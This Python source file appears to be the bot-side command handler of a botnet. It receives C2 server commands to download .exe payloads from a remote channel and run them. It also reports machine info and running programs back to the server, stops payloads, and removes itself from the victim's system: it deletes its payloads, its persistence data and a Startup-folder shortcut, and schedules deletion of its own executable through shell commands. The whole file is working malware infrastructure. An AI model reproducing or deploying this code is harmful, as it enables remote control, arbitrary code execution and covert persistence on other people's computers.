# Import Libraries
import os
import sys
import requests
import subprocess

# Import Classes
from bots.Command import Command
from bots.CommandConverter import CommandConverter

from bots.MachineInfo import MachineInfo
from bots.ExecutingProgramHandler import ExecutingProgramHandler
from bots.NotificationBuilder import NotificationBuilder

# Import Dictionaries
from bots.dictionaries.CommunicationChannels import CommChannels


# Handles the recieved commands from the C2 server and executes the corresponding actions on the bot's system
class CommandHandler:
    def __init__(self, bot, crypt):
        self.bot = bot
        self.crypt = crypt

        self.machineInfo = MachineInfo()
        self.exeHandler = ExecutingProgramHandler()
        self.notificationBuilder = NotificationBuilder(self.crypt)
        self.cmdConverter = CommandConverter()


    """ --- PRIVATE METHODS --- """

    # Download the payload from a specified URL and save it to the bot's system
    def __download_payload(self, id: str, params: list):
        payloadURL = CommChannels["DOWNLOAD_CHANNEL"] + f"/{id}.exe"
        outputFile = f"payloads/{id}.exe"

        # Ensure the payloads directory exists
        os.makedirs("payloads", exist_ok=True)

        r = requests.get(payloadURL)
        if r.status_code == 200:
            with open(outputFile, "wb") as f:
                f.write(r.content)
        else:
            print("Failed to download file:", r.status_code)


    # Execute the payload on the bot's system, handle any errors that may occur during execution
    def __executePayload(self, id: str, params: list):
        isProgramSpecified = (id != None)
        if (not isProgramSpecified):
            return
        
        try:
            payload_name = f"payloads/{id}.exe"
            self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP), name=id)
        except Exception as e:
            print(f"Error executing payload {e}")

    # Stop any running payloads
    def __stopPayload(self, id: str, params: list):
        stopAllPrograms = (id == None)
        try: 
            if (stopAllPrograms):
                self.exeHandler.stop_all_programs()
            else:
                self.exeHandler.stop_program(name=id)
        except Exception as e:
            print(f"Error stopping payload {e}")

    # Announce bot status to C2 server
    def __announce_status(self, id: str, params: list):
        mInfo = self.machineInfo.get_machine_info()
        prgrmsRunning = self.exeHandler.get_running_programs()
        ntfy = self.notificationBuilder.build_notification(mInfo, prgrmsRunning, Command.STATUS)

        r = requests.post(CommChannels["RESPONSE_CHANNEL"], data=ntfy.encode(encoding='utf-8'))
        if r.status_code == 200:
            print(f"Bot announced status successfully.")
        else:
            print(f"Bot failed to announce status.")


    # Remove all payload files from the bot's system
    def __cleanupPayloads(self):
        path = "./payloads"

        if not os.path.exists(path):
            return

        dir_list = os.listdir(path)

        for file in dir_list:
            os.remove(path + "/" + file)
        os.removedirs(path)

    
    # Remove the presistant data file from the bot's system
    def __cleanupPresistantData(self):
        try:
            os.remove("Botnet_precistantData.txt")
        except Exception as e:
            pass

    # Delete bot executable from victims system
    def __schedule_self_delete(self):
        exe_path = os.path.abspath(sys.argv[0])
        if os.name == "nt":  # Windows
            subprocess.Popen(
                f'cmd /c ping 127.0.0.1 -n 5 > nul & del "{exe_path}"',
                shell=True
            )
        else:  # Linux / macOS
            subprocess.Popen(
                f'sh -c "sleep 5 && rm \\"{exe_path}\\""',
                shell=True
            )

        # Delete shortcut if exists
        shortcut_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows',
                                     'Start Menu', 'Programs', 'Startup', 'BotnetStartup.lnk')
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)

        # Stop bot
        self.bot.quit = True


    # Take all necesarry steps so safely remove the bots program
    def __handle_remove(self, id, params):
        try:
            self.exeHandler.stop_all_programs()
            self.__cleanupPayloads()
            self.__cleanupPresistantData()
            self.__schedule_self_delete()
        except Exception as e:
            print(f"Error remove: {e}")


    # Uniformly handle "for all" or "for me" command executions
    def __handle_general(self, func, id: str, params: list):
        IS_FOR_ALL = (params == [])
        IS_FOR_ME = False

        if (not IS_FOR_ALL):
            IS_FOR_ME = self.machineInfo.IP_ADDR in params
        
        if IS_FOR_ALL:
            func(id, params)
        elif IS_FOR_ME:
            func(id, params)
        else:
            pass        


    """ --- PUBLIC METHODS --- """

    # Handle commands received from C2 server
    def handle_command(self, cmd_tuple):
        cmd, id, params = cmd_tuple
        cmd = self.cmdConverter.convert_cmd_to_enum(cmd)

        print(f"Handling command: {cmd}, id: {id}, params: {params}")

        if cmd == Command.STATUS:
            self.__handle_general(self.__announce_status, id, params)
        elif cmd == Command.PAYLOAD:
            self.__handle_general(self.__download_payload, id, params)
        elif cmd == Command.EXECUTE:
            self.__handle_general(self.__executePayload, id, params)
        elif cmd == Command.STOP:
            self.__handle_general(self.__stopPayload, id, params)
        elif cmd == Command.REMOVE:
            self.__handle_general(self.__handle_remove, id, params)
        else:
            print ("Received unknown command, ignoring...")